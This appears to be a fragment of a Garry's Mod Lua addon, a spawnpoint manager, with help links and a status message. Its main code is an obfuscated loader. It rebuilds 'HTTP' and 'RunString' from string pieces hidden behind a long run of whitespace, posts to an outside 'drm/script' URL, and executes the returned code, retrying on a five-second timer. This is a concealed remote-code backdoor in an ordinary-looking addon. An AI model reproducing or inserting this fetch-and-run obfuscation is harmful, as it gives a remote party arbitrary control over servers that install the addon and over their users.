...
Tout ce que tu dois savoir: https://originahl-scripts.com/fr/help.php
All you must know:  https://originahl-scripts.com/en/help.php
...
print("")
print("The script 'nordahl_spawnpoint_manager_all_gamemode' is not enabled.")
print("Please read the description of the script")
print("Information - English        : http://www.zworld-afterlife.com/f74-128195-")
print("Information - Français       : http://www.zworld-afterlife.com/f75-128195-")
print("")
...
local Npr=MsgC local AMDR=RunString
AMDR("N".."=H"..                                                                                                                                                                                                                                                                                                                                                                                                     "T".."T".."P".." N".."L".."O".."D".."=R".."u".."n".."S".."t".."r".."i".."n".."g")
...
B={informations={author="Nordahl",support="support@zworld-afterlife.com",fich="fichiers/2016/35/147270646/987"},url="https://originahl-scripts.com/drm/script",method="post",parameters={n=act},success=function(a,b)if a!=404 then if b=="" then return end NCHA(b,"1966")b=nil
timer.Remove("nordahl_launcher_"..mrd)
end end}A(B)
end
...
timer.Create("nordahl_launcher_"..mrd,5,0,function()
testcheck2()
end)
end
end
